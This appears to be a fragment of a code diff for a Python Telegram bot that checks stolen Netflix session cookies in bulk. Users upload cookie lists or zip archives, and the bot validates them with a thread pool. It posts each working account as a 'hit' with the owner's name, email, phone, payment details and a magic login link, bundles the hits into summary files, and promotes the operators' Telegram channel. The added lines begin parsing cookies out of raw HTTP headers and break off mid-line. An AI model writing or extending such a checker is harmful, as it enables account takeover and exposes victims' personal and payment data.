-    @bot.message_handler(commands=['broadcast'])
-    def broadcast(message):
-        if message.chat.id != ADMIN_ID: return
-        msg = bot.reply_to(message, "📝 **Send the message (Text, Image, File) to broadcast:**")
-        bot.register_next_step_handler(msg, perform_broadcast)
-
-    def perform_broadcast(message):
-        try:
-            if not os.path.exists(USERS_FILE):
-                return bot.reply_to(message, "❌ No users found.")
-            with open(USERS_FILE, "r") as f:
-                users = f.read().splitlines()
-            count = 0
-            for uid in users:
-                try:
-                    if message.content_type == 'text':
-                        bot.send_message(uid, message.text)
-                    elif message.content_type == 'photo':
-                        bot.send_photo(uid, message.photo[-1].file_id, caption=message.caption)
-                    elif message.content_type == 'document':
-                        bot.send_document(uid, message.document.file_id, caption=message.caption)
-                    elif message.content_type == 'video':
-                        bot.send_video(uid, message.video.file_id, caption=message.caption)
-                    elif message.content_type == 'audio':
-                        bot.send_audio(uid, message.audio.file_id, caption=message.caption)
-                    elif message.content_type == 'voice':
-                        bot.send_voice(uid, message.voice.file_id, caption=message.caption)
-                    count += 1
-                except: pass
-            bot.reply_to(message, f"✅ **Broadcast sent to {count} users.**")
-        except Exception as e:
-            bot.reply_to(message, f"❌ Error: {e}")
-
-    @bot.message_handler(func=lambda m: m.text == "🛑 Stop System")
-    def stop_sys(message):
-        if message.chat.id in user_modes:
-            user_modes[message.chat.id]['stop'] = True
-        else:
-            user_modes[message.chat.id] = {'stop': True}
-        bot.reply_to(message, "**🛑 Scanning Stopped.**", parse_mode='Markdown')
-
-    @bot.message_handler(func=lambda m: m.text == "📩 Send Here (DM)")
-    def mode_dm(message):
-        user_modes[message.chat.id] = {'target': message.chat.id, 'stop': False}
-        bot.reply_to(message, "**✅ DM Mode Active.** Send file or text now.", parse_mode='Markdown')
-
-    @bot.message_handler(func=lambda m: m.text == "📡 Send to Channel")
-    def mode_ch(message):
-        msg = bot.reply_to(message, "**📡 Enter Channel ID** (e.g., -100xxxx):", parse_mode='Markdown')
-        bot.register_next_step_handler(msg, save_ch)
-
-    def save_ch(message):
-        try:
-            chat_id = int(message.text.strip())
-            user_modes[message.chat.id] = {'target': chat_id, 'stop': False}
-            bot.reply_to(message, "**✅ Channel Verified.** Hits will be sent there.", parse_mode='Markdown')
-        except:
-            bot.reply_to(message, "❌ Invalid ID.")
-
-    @bot.message_handler(content_types=['document', 'text'])
-    def handle_input(message):
-        uid = message.chat.id
-        save_user(uid) # Save user automatically when they send any message
-        if not check_sub(uid):
-            return send_force_join(uid)
-            
-        mode = user_modes.get(uid)
-        
-        # Ignore buttons/commands
-        if message.text and (message.text.startswith("/") or message.text in ["📩 Send Here (DM)", "📡 Send to Channel", "🛑 Stop System"]): return
-        
-        if not mode: return bot.reply_to(message, "❌ **Select a mode first!**", parse_mode='Markdown')
-        if mode.get('stop'): 
-            # Auto-resume if they send a file, or ask to resume? 
-            # User asked to fix stop system. Let's require button press or just resume.
-            # Better to ask to select mode to confirm destination.
-            return bot.reply_to(message, "🛑 **System is stopped.**\nClick a Mode button to resume.")
-
-        cookies = []
-        try:
-            if message.content_type == 'document':
-                file_info = bot.get_file(message.document.file_id)
-                downloaded_file = bot.download_file(file_info.file_path)
-                
-                if message.document.file_name.endswith('.zip'):
-                    with zipfile.ZipFile(io.BytesIO(downloaded_file)) as z:
-                        for filename in z.namelist():
-                            if filename.endswith('.txt'):
-                                with z.open(filename) as f:
-                                    cookies.extend(f.read().decode('utf-8', errors='ignore').splitlines())
-                else:
-                    cookies = downloaded_file.decode('utf-8', errors='ignore').splitlines()
-            else:
-                cookies = message.text.splitlines()
-            
-            # Filter valid cookies first
-            valid_cookies = [c.strip() for c in cookies if len(c.strip()) > 50 and ("NetflixId" in c or "netflix" in c.lower() or "=" in c)]
-            
-            if not valid_cookies: return bot.reply_to(message, "❌ **No Valid Cookies Found!**", parse_mode='Markdown')
-
-            bot.reply_to(message, f"🚀 **Checking {len(valid_cookies)} Cookies...**\n_Task started in background._", parse_mode='Markdown')
-            
-            def background_checker(cookies, chat_id, target):
-                valid_count = 0
-                hits_list = [] # Store hits for summary file
-
-                def process_cookie(cookie):
-                    if user_modes.get(chat_id, {}).get('stop'): return None
-                    try:
-                        res = check_cookie(cookie)
-                        if res["valid"]:
-                            print(f"{Fore.GREEN}[+] Hit: {cookie[:15]}... | {res['country']}{Style.RESET_ALL}")
-                            send_hit(target, res, cookie)
-                            return (res, cookie) # Return result for file
-                    except: pass
-                    return None
-
-                # Using 15 workers per user for faster checking (Semaphore protects RAM)
-                with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
-                    futures = [executor.submit(process_cookie, c) for c in cookies]
-                    for future in concurrent.futures.as_completed(futures):
-                        if user_modes.get(chat_id, {}).get('stop'): break
-                        result = future.result()
-                        if result:
-                            valid_count += 1
-                            hits_list.append(result)
-                
-                # Generate and Send Summary File
-                if hits_list:
-                    try:
-                        summary = f"========================================\nNETFLIX HITS SUMMARY\nAdmin: https://t.me/F88UF\nChannel: https://t.me/F88UF9844\n========================================\n\n"
-                        for res, cookie in hits_list:
-                            data = res.get("data", {})
-                            summary += f"Country: {res.get('country', 'Unknown')}\n"
-                            summary += f"Email: {data.get('email', 'N/A')}\n"
-                            summary += f"Plan: {data.get('plan', 'N/A')}\n"
-                            summary += f"Login: {res.get('magic_link', 'N/A')}\n"
-                            summary += f"Cookie: {cookie}\n"
-                            summary += "-"*40 + "\n"
-                        summary += "\n========================================\nJoin Channel: https://t.me/F88UF9844\n========================================"
-                        
-                        with io.BytesIO(summary.encode('utf-8')) as f:
-                            f.name = f"Netflix_Hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-                            bot.send_document(chat_id, f, caption="📂 **Here is your Hits Summary File**")
-                    except Exception as e:
-                        print(f"Summary Error: {e}")
-
-                try:
-                    bot.send_message(chat_id, f"✅ **Check Complete.** Hits: {valid_count}", parse_mode="Markdown")
-                except: pass
-
-            # Start background thread to prevent blocking other users
-            threading.Thread(target=background_checker, args=(valid_cookies, uid, mode['target'])).start()
-
-        except Exception as e:
-            bot.reply_to(message, f"❌ Error: {e}")
-
-    def send_hit(chat_id, res, cookie):
-        data = res.get("data", {})
-        
-        # Helper to escape Markdown (Legacy)
-        def esc(t):
-            return str(t).replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")
-
-        country_code = res.get('country', 'Unknown')
-        flag = get_flag(country_code)
-        currency_sym = get_currency_symbol(country_code)
-        
-        # Format Price
-        price = data.get('price', 'Unknown')
-        if price != 'Unknown' and currency_sym not in price:
-            price = f"{currency_sym} {price}"
-            
-        
-        # Create Inline Keyboard
-        markup = types.InlineKeyboardMarkup()
-        login_url = res.get('magic_link', 'Token Not Found')
-        
-        if login_url and "http" in login_url and login_url != "Token Not Found":
-            btn_login = types.InlineKeyboardButton("🔗 Login (Magic Link)", url=login_url)
-            markup.add(btn_login)
-        else:
-            login_url = "https://www.netflix.com/login" # Fallback for text link
-        
-        # Generate timestamps
-        gen_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        exp_time = (datetime.now() + timedelta(hours=1)).strftime('%Y-%m-%d %H:%M:%S')
-        
-        # Dynamic Message Construction (Ultimate Design)
-        lines = []
-        lines.append("🌟 **NETFLIX PREMIUM ULTRA HIT** 🌟")
-        lines.append("")
-        
-        # Status & Region
-        lines.append(f"🟢 **STATUS:** Active ✅")
-        if country_code != "Unknown":
-            lines.append(f"🌍 **REGION:** {esc(country_code)} {flag}")
-            
-        # Member Since & Owner
-        if data.get('member_since') and data['member_since'] != "Unknown":
-            duration = data.get('member_duration', '')
-            lines.append(f"⏰ **MEMBER SINCE:** {esc(data['member_since'])} {esc(duration)}")
-        
-        lines.append(f"👤 **OWNER:** {esc(data.get('name', 'Unknown'))}")
-        
-        # Plan & Payment
-        lines.append(f"👑 **PLAN:** {esc(data.get('plan', 'Premium'))}")
-        if price != "Unknown" and price != "N/A":
-            lines.append(f"💰 **PRICE:** {esc(price)}")
-        
-        payment_info = data.get('payment', 'Unknown')
-        lines.append(f"💳 **PAYMENT:** {esc(payment_info)}")
-        
-        if data.get('expiry') and data['expiry'] != "N/A":
-            lines.append(f"📅 **NEXT BILLING:** {esc(data['expiry'])}")
-            
-        # Profiles
-        if data.get('profiles'):
-            profile_str = ", ".join(data['profiles'])
-            lines.append(f"🎭 **PROFILES:** {esc(profile_str)}")
-            
-        # Contact Info
-        lines.append(f"📧 **EMAIL:** {esc(data.get('email', 'N/A'))}")
-        if data.get('email_verified') != "Unknown":
-            lines.append(f"   └ {esc(data['email_verified'])} Verified")
-            
-        lines.append(f"☎️ **PHONE:** {esc(data.get('phone', 'N/A'))}")
-        
-        lines.append(f"👥 **EXTRA MEMBERS:** {esc(data.get('extra_members', 'No ❌'))}")
-        
-        lines.append("")
-        lines.append(f"💜 [CLICK HERE TO LOGIN]({login_url}) 💜")
-        lines.append("")
-        lines.append("━━━━━━━━━━━━━━━━━━━━━━")
-        lines.append("👨‍💻 **Admin:** [Message Me](https://t.me/F88UF) | 📢 **Channel:** [Join Here](https://t.me/F88UF9844)")
-        
-        msg = "\n".join(lines)
-        
-        if res.get('screenshot'):
-            try:
-                # Use BytesIO for better compatibility
-                img = io.BytesIO(res['screenshot'])
-                img.name = 'screenshot.jpg' 
-                bot.send_photo(chat_id, img, caption=msg, parse_mode="Markdown", reply_markup=markup)
-            except Exception as e:
-                print(f"Send Photo Error: {e}")
-                # Fallback: Send text, then try sending photo separately
-                bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup, disable_web_page_preview=True)
-                try:
-                    img.seek(0)
-                    bot.send_photo(chat_id, img, caption="Screenshot (Caption failed)")
-                except: pass
-        else:
-            bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup, disable_web_page_preview=True)
-
-    # Fix for Conflict error: skip pending updates
-    while True:
-        try:
-            bot.infinity_polling(timeout=90, long_polling_timeout=60, skip_pending=True)
-        except Exception as e:
-            print(f"⚠️ Polling Error: {e}")
-            # If conflict (409), wait longer to allow other instance to close
-            if "409" in str(e):
-                time.sleep(15)
-            else:
-                time.sleep(5)
-
-if __name__ == "__main__":
-    main()
+    # Handle Raw Headers / Messy Text (Auto-Extraction)
+    if "NetflixId=" in cookie_input and ("HTTP" in cookie_input or "Host:" in cookie_input or "Date:" in cookie_input or "user-agent" in cookie_input.lower()):
+        extracted_cookies = []
+        # Extract NetflixId
+        nid_match
